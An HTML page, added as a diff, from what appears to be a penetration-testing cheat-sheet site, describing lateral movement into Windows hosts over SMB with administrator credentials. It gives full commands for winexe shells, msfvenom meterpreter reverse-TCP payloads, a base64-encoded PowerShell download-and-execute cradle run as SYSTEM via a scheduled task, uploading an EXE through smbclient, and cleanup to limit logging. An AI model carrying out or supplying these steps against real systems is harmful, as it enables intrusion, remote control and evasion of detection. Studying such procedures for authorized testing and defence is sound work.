@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <script src="css/jquery.min.js"></script>
+  <script src="css/bootstrap.min.js"></script>
+  <title>DragonFire</title>
+</head>
+<body>
+
+<!-- begin nav bar !-->  
+ <nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="navbar-header">
+	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="index.html">DragonFire</a>
+    </div>
+	<div class="collapse navbar-collapse" id="myNavbar">
+    <ul class="nav navbar-nav">
+      <li><a href="windows.html">Windows</a></li>
+      <li><a href="linux.html">Linux</a></li>
+	  <li><a href="other.html">Other Devices</a></li>
+	  <li><a href="misc.html">Misc</a></li>
+    </ul>
+	<ul class="nav navbar-nav navbar-right">
+	</ul>
+	</div>
+  </div>
+</nav>
+<!-- end nav bar !-->  
+
+<!-- begin breadcrumb !-->  
+<div class="container" style="margin-top:50px">
+  <div class="row">
+    <div class="col-md-12">
+
+<nav aria-label="breadcrumb" role="navigation">
+  <ol class="breadcrumb">
+    <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+    <li class="breadcrumb-item"><a href="windows.html">Windows</a></li>
+    <li class="breadcrumb-item active" aria-current="page">SMB Connection w/ Credentials</li>
+  </ol>
+</nav>
+
+</div>
+</div>
+</div>	
+<!-- end breadcrumb !-->  
+
+  
+<!-- begin page contents !-->
+<div class="container">
+  <h3>SMB Connection w/ Credentials</h3>
+  <div class="row">
+    <div class="col-md-8">
+      
+	  <p>Using credentials, leverage SMB to get and interactive shell and (if needed) upload a RAT</p>
+	  <h4>Table of Contents</h4>
+	  <p>SMB Connection
+	  <p>Winexe
+	  <p>Moving into a RAT
+    </div>	  
+    <!-- begin information box !-->  
+	<div class="col-md-4">
+      <div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">Information</div>
+      <div class="panel-body">
+	  <p>Work With: Windows
+	  <br>Requires: SMB access (port 445), Administrator credentials</br>
+	  <br>Uses: winexe,smbclient (included in Kali)
+	  </div>
+     </div>
+     
+     </div>
+    </div>
+   </div>
+   <!-- end information box !-->  
+</div>
+
+<!-- begin main body !-->  
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+    <h3>SMB Connection</h3>    
+    Using winexe (included in Kali) we can run arbitrary commands over SMB.  This page will detail how to connect, run commands, and upload a RAT (meterpreter) if desired.
+	
+	
+	
+    <div class="alert alert-warning" role="alert">
+    <p>Newer version of Windows restrict remote access to a LOCAL account.  If your target is not in a domain, credentials may appear to FAIL even though they are valid.  Look into LocalAccountTokenFilterPolicy for more information</p>
+    </div>	
+	
+    <div class="alert alert-warning" role="alert">
+    <p>Setting the key Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to "1" will enable Local Logons.  May be needed if you are setting up a test environment</p>
+    </div>	
+
+
+	<p><br><h4>winexe</h4>
+	<code>winexe -U ./username%password //IP "COMMAND"</code>
+	<br>winexe uses valid administrator credentials to send commands via SMB.  This process writes a binary to disk AND installs a service.  Run winexe with --uninstall to delete the binary and remove the service AFTER execution.
+    <br>Windows Event Logs will likely log EVERY connection via winexe as a new authentication.
+	
+    <p><br><h4>Usage</h4>
+    To limit logging, you can drop straight into a shell using winexe.
+    <br><code>winexe --uninstall -U ./joe%password //10.0.0.6 "cmd.exe"</code>
+	<p class="bg-warning">Note: If your cmd session dies or breaks the 'uninstall' won't happen.  Run a simple single command (hostname maybe) with the uninstall switch to remove the service.</p>
+
+
+	<br>From either a cmd window or a powershell you can gain your situational awareness, create tunnels, do whatever you need.
+    	
+	
+	<p><br><h4>Moving into a RAT</h4>
+	There are two methods detailed below for RAT integration; one using powershell, one without it.  Starting with powershell.
+	
+	<br><h4>Powershell Meterpreter</h4>
+	First, create a powershell meterpreter.  Change the options in the line below to fit your needs.
+	<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.142.134 LPORT=4444 -f psh-cmd -o filename</code>
+    <br>The msfvenom output file needs to be edited slightly.  Open the file and delete everything before the word "powershell.exe" on the first line.
+	<p><img class="img-responsive" src="images/win_powershell_edit.jpg"></img>
+	
+	<br>Start your meterpreter listener as well.
+	<br><code>msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.142.134; set lport 4444;show options"</code>
+	
+	<br><br>Next, start a python web server in the folder with the modified powershell meterpreter.  We will use this to get the file to the target.
+	<br><code>python -m SimpleHTTPServer [PORT]</code>
+	
+	<br><br>With that setup, connect to the target and start a powershell session.
+	<br><code>winexe -U ./joe%password //10.0.0.6 "powershell.exe"</code>
+	
+	<br><br>From here, you can run <code>iex(New-Object Net.WebClient).DownloadString('http://[YOURIP]:[PORT]/filename')</code> however, that will get you a shell as a user, and you'd need to privesc.  We can do better.
+	
+	<br><br>We will need to convert the download string to a base64 that powershell can use.  DONT TRY TO USE kali base64, it comes out different.  We will use powershell on the target for us.
+	<br>From within your powershell prompt, paste the following (change to fit your specifics)
+	<br><code>$Text = "iex(New-Object Net.WebClient).DownloadString('http://192.168.142.134:8080/filename')";
+    <br>$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+    <br>$EncodedText =[Convert]::ToBase64String($Bytes)
+    <br>$EncodedText</code>
+	<br>Copy the output, you'll need it in a second.
+	
+    <br><br>To run this as system, we are going to schedule and run a job to run as system, then delete that job.
+	<br><code>schtasks /create /ru SYSTEM /sc once /st 23:59 /tn TASK_NAME /tr "powershell.exe -nop -e [encoded string]"
+          <br>schtasks /run /tn TASK_NAME
+          <br>schtasks /delete /tn TASK_NAME /F</code>
+		  
+    <br><br>You should see a hit on the python web server requesting the file, followed my a connection to your meterpreter handler.  Run a <code>GETUID</code> and you'll see you're now system.  Profit.
+	
+	
+	<br><br><p><br><h4>No Powershell Option</h4>
+	<div class="alert alert-warning" role="alert">
+    <p>This method writes an EXE to disk.  While this isn't always ideal, sometimes it is needed.</p>
+    </div>	
+
+	<br>Maybe your target doesn't have powershell, or is proxying web traffic and can't pick up your file.  Whatever the reason, here is the same thing, without powershell.
+	<br><br>Create a meterpreter payload, this time as an exe.
+	<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.142.134 LPORT=4444 -f exe -o win_exe</code>
+	<br>Set up your handler the same way
+	<br><code>msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.142.134; set lport 4444;show options"</code>
+	
+	<br><br>With that set, we are going to connect using smbclient and move our .exe to the target
+	<br>First, list the shares we can use.
+	<br><code>smbclient -U joe -L //10.0.0.6</code>
+	<br>Then connect to one, probably C$
+	<code>smbclient -U joe //10.0.0.6/C$</code>
+	<br>Now upload your exe someplace
+	<code>put /root/win_exe windows\temp\win.exe</code>
+	
+	<br><br>Now just use the winexe steps from above to get a command prompt and run the exe.  You should see your meterpreter connect.
+	<br><br>You are NOT SYSTEM yet AND there is still an EXE on the file system.  <kbd>MIGRATE</kbd> into a good SYSTEM process and <kbd>DELETE</kbd> the executable.
+	
+	
+
+	
+	
+	
+	
+	</div><!-- end of 'row' tag !-->
+	</div><!-- end of main body!-->
+   <br><br><br><br>
+</div>
+</div>
+
+
+
+
+
+
+
+
+	
+	
+</body>
+</html>
